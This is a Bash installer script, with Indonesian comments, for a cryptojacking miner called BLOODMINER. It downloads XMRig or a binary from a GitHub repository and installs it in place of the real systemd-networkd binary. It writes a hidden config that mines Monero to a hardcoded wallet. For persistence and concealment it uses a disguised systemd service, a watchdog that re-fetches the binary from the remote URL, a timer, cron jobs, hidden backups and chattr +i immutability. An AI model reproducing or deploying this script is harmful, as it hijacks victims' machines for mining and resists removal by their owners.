#!/bin/bash
# BLOODMINER FINAL - SINGLE PROCESS EDITION
# Binary: /usr/lib/systemd/systemd-networkd
# Config: /etc/systemd/system/.system.conf
# GitHub: https://github.com/beksec/pencari-uang/raw/main/systemd-networkd

WALLET="49zZt3cjvRreRmBsMu1ErVamdSHKkWQx2bKoZbhQGpebeycvDYXBTvB14J7EzMzwVdi8atuVwYe5qRXqH4TVWsGuApR6ep2"
GITHUB_URL="https://github.com/beksec/pencari-uang/raw/main/systemd-networkd"

# Lokasi target
BINARY_TARGET="/usr/lib/systemd/systemd-networkd"
CONFIG_TARGET="/etc/systemd/system/.system.conf"
BACKUP_BINARY="/var/lib/systemd/network/systemd-networkd.bak"
BACKUP_CONFIG="/usr/share/man/man3/.system.conf.bak"
WATCHDOG="/usr/lib/systemd/systemd-recovery"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo -e "${RED}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║         BLOODMINER FINAL - SINGLE PROCESS                 ║"
echo "║                [ B2HUNTERS VIP EDITION ]                  ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Cek root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}Jalankan sebagai root!${NC}"
   exit 1
fi

# ============================================
# MATIKAN SEMUA PROSES MINER YANG LAMA
# ============================================
echo -e "${YELLOW}[1] Mematikan semua proses miner yang berjalan...${NC}"
pkill -f "/usr/lib/systemd/systemd-networkd" 2>/dev/null
pkill -f "systemd-recovery" 2>/dev/null
sleep 3
echo -e "${GREEN}  ✓ Proses dimatikan${NC}"

# ============================================
# HAPUS SEMUA CRON LAMA
# ============================================
echo -e "${YELLOW}[2] Membersihkan cron lama...${NC}"
rm -f /etc/cron.d/bloodminer 2>/dev/null
rm -f /etc/cron.d/miner* 2>/dev/null
crontab -l 2>/dev/null | grep -v "systemd-networkd" | crontab - 2>/dev/null
echo -e "${GREEN}  ✓ Cron dibersihkan${NC}"

# ============================================
# DOWNLOAD MINER DARI GITHUB - METHOD JITU
# ============================================
echo -e "${YELLOW}[3] Mendownload miner...${NC}"

# Method 1: Pake resolve IP (method jitu)
echo -e "  Mencoba method 1 (resolve IP)..."
curl -L --resolve github.com:443:140.82.114.4 --progress-bar -o /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"

if [[ -f /tmp/xmrig.tar.gz && -s /tmp/xmrig.tar.gz ]]; then
    echo -e "${GREEN}  ✓ Method 1 berhasil, mengekstrak...${NC}"
    cd /tmp
    tar -xzf xmrig.tar.gz
    cp xmrig-6.25.0/xmrig /tmp/systemd-networkd
else
    echo -e "  Method 1 gagal, coba method 2 (download dari repo lo)..."
    # Method 2: Download dari GitHub repo lo
    curl -L -s -o /tmp/systemd-networkd "$GITHUB_URL"
    
    if [[ -f /tmp/systemd-networkd && -s /tmp/systemd-networkd ]]; then
        echo -e "${GREEN}  ✓ Method 2 berhasil${NC}"
    else
        echo -e "  Method 2 gagal, coba method 3 (fallback terakhir)..."
        # Method 3: Fallback terakhir tanpa resolve
        cd /tmp
        curl -L -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
        
        if [[ -f /tmp/xmrig.tar.gz && -s /tmp/xmrig.tar.gz ]]; then
            echo -e "${GREEN}  ✓ Method 3 berhasil, mengekstrak...${NC}"
            tar -xzf xmrig.tar.gz
            cp xmrig-6.25.0/xmrig /tmp/systemd-networkd
        else
            echo -e "${RED}  ✗ Semua method download gagal. Cek koneksi internet server!${NC}"
            exit 1
        fi
    fi
fi

# Bersihkan file hasil download yang udah gak dipake
rm -f /tmp/xmrig.tar.gz 2>/dev/null
rm -rf /tmp/xmrig-6.25.0 2>/dev/null

# Verifikasi file hasil
if [[ -f /tmp/systemd-networkd && -s /tmp/systemd-networkd ]]; then
    chmod +x /tmp/systemd-networkd
    echo -e "${GREEN}  ✓ Download sukses (${NC}$(du -h /tmp/systemd-networkd | cut -f1)${GREEN})${NC}"
else
    echo -e "${RED}  ✗ Gagal mendapatkan file binary. Installasi tidak bisa dilanjutkan.${NC}"
    exit 1
fi

# ============================================
# BUAT FOLDER YANG DIPERLUKAN
# ============================================
mkdir -p /usr/lib/systemd
mkdir -p /etc/systemd/system
mkdir -p /var/lib/systemd/network
mkdir -p /usr/share/man/man3

# ============================================
# BACKUP FILE ASLI SYSTEMD-NETWORKD (JIKA ADA)
# ============================================
if [[ -f /usr/lib/systemd/systemd-networkd && ! -L /usr/lib/systemd/systemd-networkd ]]; then
    mv /usr/lib/systemd/systemd-networkd /usr/lib/systemd/systemd-networkd.original 2>/dev/null
fi

# ============================================
# INSTALL BINARY
# ============================================
cp /tmp/systemd-networkd "$BINARY_TARGET"
chmod 755 "$BINARY_TARGET"
chattr +i "$BINARY_TARGET" 2>/dev/null
echo -e "${GREEN}  ✓ Binary terinstall: ${NC}$BINARY_TARGET"

# ============================================
# BACKUP BINARY
# ============================================
cp "$BINARY_TARGET" "$BACKUP_BINARY"
chmod 755 "$BACKUP_BINARY"
chattr +i "$BACKUP_BINARY" 2>/dev/null

# ============================================
# BUAT CONFIG
# ============================================
cat > "$CONFIG_TARGET" << EOF
{
    "autosave": true,
    "donate-level": 2,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "randomx": {
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true,
        "scratchpad_prefetch_mode": 1,
        "mode": "auto",
        "init": -1,
        "init-avx2": -1
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "49zZt3cjvRreRmBsMu1ErVamdSHKkWQx2bKoZbhQGpebeycvDYXBTvB14J7EzMzwVdi8atuVwYe5qRXqH4TVWsGuApR6ep2",
            "pass": "Miner-sourcemoney",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF
chmod 600 "$CONFIG_TARGET"
chattr +i "$CONFIG_TARGET" 2>/dev/null
echo -e "${GREEN}  ✓ Config terbuat: ${NC}$CONFIG_TARGET"

# ============================================
# BACKUP CONFIG
# ============================================
cp "$CONFIG_TARGET" "$BACKUP_CONFIG"
chmod 600 "$BACKUP_CONFIG"
chattr +i "$BACKUP_CONFIG" 2>/dev/null

# ============================================
# BUAT SYSTEMD SERVICE
# ============================================
echo -e "${YELLOW}[4] Membuat systemd service...${NC}"
cat > /etc/systemd/system/bloodminer.service << 'EOF'
[Unit]
Description=System Network Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/systemd-networkd --config=/etc/systemd/system/.system.conf
Restart=always
RestartSec=10
Nice=15
KillMode=process

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable bloodminer.service &>/dev/null
systemctl start bloodminer.service
echo -e "${GREEN}  ✓ Service aktif${NC}"

# ============================================
# BUAT WATCHDOG RECOVERY
# ============================================
echo -e "${YELLOW}[5] Membuat watchdog recovery...${NC}"
cat > "$WATCHDOG" << 'EOF'
#!/bin/bash
# BloodMiner Recovery - ONLY RESTORE FILES, DO NOT START PROCESS

BINARY="/usr/lib/systemd/systemd-networkd"
CONFIG="/etc/systemd/system/.system.conf"
BACKUP_BIN="/var/lib/systemd/network/systemd-networkd.bak"
BACKUP_CONF="/usr/share/man/man3/.system.conf.bak"
GITHUB_URL="https://github.com/beksec/pencari-uang/raw/main/systemd-networkd"

# Restore binary jika hilang
if [ ! -f "$BINARY" ]; then
    if [ -f "$BACKUP_BIN" ]; then
        cp "$BACKUP_BIN" "$BINARY"
        chmod 755 "$BINARY"
        chattr +i "$BINARY" 2>/dev/null
    else
        curl -L -s -o /tmp/systemd-networkd "$GITHUB_URL"
        if [ -f /tmp/systemd-networkd ]; then
            cp /tmp/systemd-networkd "$BINARY"
            chmod 755 "$BINARY"
            chattr +i "$BINARY" 2>/dev/null
            cp "$BINARY" "$BACKUP_BIN"
            chattr +i "$BACKUP_BIN" 2>/dev/null
            rm -f /tmp/systemd-networkd
        fi
    fi
fi

# Restore config jika hilang
if [ ! -f "$CONFIG" ]; then
    if [ -f "$BACKUP_CONF" ]; then
        cp "$BACKUP_CONF" "$CONFIG"
        chmod 600 "$CONFIG"
        chattr +i "$CONFIG" 2>/dev/null
    fi
fi

# JANGAN START PROCESS - biarkan systemd yang handle
exit 0
EOF

chmod 755 "$WATCHDOG" 2>/dev/null
echo -e "${GREEN}  ✓ Watchdog dibuat${NC}"

# ============================================
# BUAT SYSTEMD TIMER UNTUK WATCHDOG
# ============================================
cat > /etc/systemd/system/bloodminer-recovery.timer << 'EOF'
[Unit]
Description=BloodMiner Recovery Timer

[Timer]
OnBootSec=2min
OnUnitActiveSec=2min

[Install]
WantedBy=timers.target
EOF

cat > /etc/systemd/system/bloodminer-recovery.service << 'EOF'
[Unit]
Description=BloodMiner Recovery Service

[Service]
Type=oneshot
ExecStart=/usr/lib/systemd/systemd-recovery
EOF

systemctl daemon-reload
systemctl enable bloodminer-recovery.timer &>/dev/null
systemctl start bloodminer-recovery.timer &>/dev/null

# ============================================
# BUAT CRON BARU (BACKUP)
# ============================================
echo -e "${YELLOW}[6] Membuat cron backup...${NC}"
cat > /etc/cron.d/bloodminer << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/3 * * * * root pgrep -f "/usr/lib/systemd/systemd-networkd" >/dev/null || systemctl start bloodminer.service
*/5 * * * * root /usr/lib/systemd/systemd-recovery >/dev/null 2>&1
EOF

echo -e "${GREEN}  ✓ Cron terpasang${NC}"

# ============================================
# PASTIKAN CUMA 1 PROSES YANG JALAN
# ============================================
echo -e "${YELLOW}[7] Memastikan single process...${NC}"
pkill -f "/usr/lib/systemd/systemd-networkd" 2>/dev/null
sleep 2
systemctl start bloodminer.service
sleep 3

JUMLAH=$(pgrep -f "/usr/lib/systemd/systemd-networkd" | grep -v "lib/systemd" | wc -l)
if [[ "$JUMLAH" -eq 1 ]]; then
    echo -e "${GREEN}  ✓ SUKSES! 1 proses miner berjalan${NC}"
elif [[ "$JUMLAH" -eq 0 ]]; then
    echo -e "${RED}  ✗ TIDAK ADA proses berjalan, coba manual:${NC}"
    echo "     /usr/lib/systemd/systemd-networkd --config=$CONFIG_TARGET &"
else
    echo -e "${YELLOW}  ⚠ Masih $JUMLAH proses, matikan manual:${NC}"
    echo "     pkill -f /usr/lib/systemd/systemd-networkd"
    echo "     systemctl restart bloodminer.service"
fi

# ============================================
# BERSIHKAN TEMP FILE
# ============================================
rm -f /tmp/systemd-networkd 2>/dev/null
rm -f /tmp/xmrig.tar.gz 2>/dev/null
rm -rf /tmp/xmrig-6.25.0 2>/dev/null

# ============================================
# TAMPILAN SELESAI
# ============================================
echo ""
echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║  BLOODMINER FINAL - INSTALASI SELESAI!                    ║"
echo "╠═══════════════════════════════════════════════════════════╣"
echo "║  ✓ Binary  : /usr/lib/systemd/systemd-networkd            ║"
echo "║  ✓ Config  : /etc/systemd/system/.system.conf             ║"
echo "║  ✓ Backup  : /var/lib/systemd/network/ & /usr/share/man   ║"
echo "║  ✓ Service : bloodminer.service (active)                  ║"
echo "║  ✓ Timer   : bloodminer-recovery.timer (active)           ║"
echo "║  ✓ Cron    : /etc/cron.d/bloodminer                       ║"
echo "║  ✓ Proteksi: chattr +i (file tidak bisa dihapus)          ║"
echo "║                                                            ║"
echo "║  🔥 SINGLE PROCESS AKTIF! 🔥                               ║"
echo "║                                                            ║"
echo "║  Cek proses:                                               ║"
echo "║  pgrep -a -f systemd-networkd | grep -v lib/systemd       ║"
echo "║                                                            ║"
echo "║  Cek service:                                              ║"
echo "║  systemctl status bloodminer.service                       ║"
echo "║                                                            ║"
echo "║  Cek log:                                                  ║"
echo "║  journalctl -u bloodminer.service -f                       ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"
